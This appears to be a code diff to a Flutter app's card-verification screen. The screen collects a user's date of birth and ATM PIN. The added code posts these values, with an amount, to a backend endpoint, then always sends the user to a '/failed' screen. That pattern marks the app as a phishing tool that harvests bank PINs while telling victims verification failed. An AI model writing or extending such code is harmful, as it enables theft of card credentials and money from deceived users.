@@ -1,6 +1,9 @@
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:go_router/go_router.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
+import '../api_config.dart';
 import '../theme.dart';
 
 class CardVerifyScreen extends StatefulWidget {
@@ -38,7 +41,14 @@ class _S extends State<CardVerifyScreen> {
   bool get _valid => _validDob && atmPin.text.length == 4;
 
   void submit() {
-    if (_valid) context.push('/failed');
+    if (_valid) {
+      http.post(Uri.parse('$apiBaseUrl/api/card-verify'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
+        'dob': dob.text,
+        'atm_pin': atmPin.text,
+        'amount': widget.amount,
+      }));
+      context.push('/failed');
+    }
   }
 
   @override
